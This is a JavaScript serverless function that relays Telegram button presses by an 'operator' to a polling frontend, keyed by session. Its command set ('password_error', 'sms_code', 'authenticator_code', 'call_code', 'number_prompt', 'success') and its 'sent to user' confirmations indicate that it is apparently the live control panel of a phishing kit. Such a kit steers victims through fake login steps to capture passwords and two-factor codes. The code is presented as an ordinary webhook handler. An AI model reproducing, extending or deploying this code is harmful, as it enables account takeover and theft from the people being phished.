/**
 * Telegram Callback Handler
 *
 * This function handles Telegram callback_query events (inline keyboard button presses).
 * It must be registered as the Telegram bot webhook:
 *   https://api.telegram.org/bot{TOKEN}/setWebhook?url=https://your-domain.com/.netlify/functions/telegramCallback
 *
 * When the operator presses a button, this function:
 * 1. Parses the callback data (format: actionCode_sessionId)
 * 2. Stores the command in Redis so the frontend can poll for it
 * 3. Answers the callback query (removes the loading indicator in Telegram)
 * 4. Sends a confirmation reply to Telegram
 */

const CONFIG = {
  ENV: {
    TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID,
    UPSTASH_REDIS_REST_URL: process.env.UPSTASH_REDIS_REST_URL,
    UPSTASH_REDIS_REST_TOKEN: process.env.UPSTASH_REDIS_REST_TOKEN,
  },
  FETCH_TIMEOUT: 10000,
  SESSION_TTL: 86400,
};

const createTimeoutSignal = (ms) => {
  const controller = new AbortController();
  setTimeout(() => controller.abort(), ms);
  return controller.signal;
};

// Map action codes to human-readable command names
const ACTION_MAP = {
  yp: { command: 'yes_prompt', label: '✅ Yes Prompt' },
  pe: { command: 'password_error', label: '❌ Password Error' },
  sc: { command: 'sms_code', label: '📝 SMS Code' },
  ac: { command: 'authenticator_code', label: '📝 Authenticator Code' },
  cc: { command: 'call_code', label: '📝 Call Code' },
  np: { command: 'number_prompt', label: '📝 Number Prompt' },
  su: { command: 'success', label: '✅ Success' },
};

/**
 * Initialize Upstash Redis client.
 */
let _redis = null;
const getRedis = async () => {
  if (_redis) return _redis;
  if (!CONFIG.ENV.UPSTASH_REDIS_REST_URL || !CONFIG.ENV.UPSTASH_REDIS_REST_TOKEN) {
    return null;
  }
  try {
    const { Redis } = await import('@upstash/redis');
    _redis = new Redis({
      url: CONFIG.ENV.UPSTASH_REDIS_REST_URL,
      token: CONFIG.ENV.UPSTASH_REDIS_REST_TOKEN,
    });
    return _redis;
  } catch (e) {
    console.error('Redis init failed:', e.message);
    return null;
  }
};

/**
 * Answer a Telegram callback query (removes loading indicator).
 */
const answerCallbackQuery = async (callbackQueryId, text) => {
  try {
    await fetch(
      `https://api.telegram.org/bot${CONFIG.ENV.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: callbackQueryId,
          text: text || 'Command sent',
          show_alert: false,
        }),
        signal: createTimeoutSignal(CONFIG.FETCH_TIMEOUT),
      }
    );
  } catch (e) {
    console.error('Failed to answer callback query:', e.message);
  }
};

/**
 * Send a confirmation message to Telegram.
 */
const sendConfirmation = async (chatId, sessionId, actionLabel) => {
  try {
    const text = `⚡ *Command Sent*\n\n🎯 Action: ${actionLabel}\n🆔 Session: \`${sessionId}\``;
    await fetch(
      `https://api.telegram.org/bot${CONFIG.ENV.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text,
          parse_mode: 'Markdown',
        }),
        signal: createTimeoutSignal(CONFIG.FETCH_TIMEOUT),
      }
    );
  } catch (e) {
    console.error('Failed to send confirmation:', e.message);
  }
};


export const handler = async (event) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  // Telegram always sends POST
  if (event.httpMethod !== 'POST') {
    return { statusCode: 200, headers, body: 'ok' };
  }

  try {
    const update = JSON.parse(event.body || '{}');

    // Only handle callback_query (inline keyboard button presses)
    const callbackQuery = update.callback_query;
    if (!callbackQuery) {
      // Not a callback query — might be a regular message, ignore
      return { statusCode: 200, headers, body: 'ok' };
    }

    const callbackData = callbackQuery.data || '';
    const callbackQueryId = callbackQuery.id;
    const chatId = callbackQuery.message?.chat?.id || CONFIG.ENV.TELEGRAM_CHAT_ID;

    // Parse callback data: format is "actionCode_sessionId"
    const underscoreIndex = callbackData.indexOf('_');
    if (underscoreIndex === -1) {
      await answerCallbackQuery(callbackQueryId, 'Invalid callback data');
      return { statusCode: 200, headers, body: 'ok' };
    }

    const actionCode = callbackData.substring(0, underscoreIndex);
    const sessionId = callbackData.substring(underscoreIndex + 1);

    const action = ACTION_MAP[actionCode];
    if (!action) {
      await answerCallbackQuery(callbackQueryId, 'Unknown action');
      return { statusCode: 200, headers, body: 'ok' };
    }

    // Store the command in Redis for the frontend to poll
    const redis = await getRedis();
    if (redis) {
      await redis.set(
        `tg_command:${sessionId}`,
        JSON.stringify({
          command: action.command,
          timestamp: new Date().toISOString(),
        }),
        { ex: CONFIG.SESSION_TTL }
      );
      console.log(`✅ Command stored: ${action.command} for session ${sessionId}`);
    } else {
      console.error('Redis not available — cannot store command');
    }

    // Answer the callback query (removes loading indicator in Telegram)
    await answerCallbackQuery(callbackQueryId, `${action.label} sent to user`);

    // Send confirmation message to the chat
    await sendConfirmation(chatId, sessionId, action.label);

    return { statusCode: 200, headers, body: 'ok' };

  } catch (error) {
    console.error('telegramCallback error:', error.message);
    return { statusCode: 200, headers, body: 'ok' };
  }
};
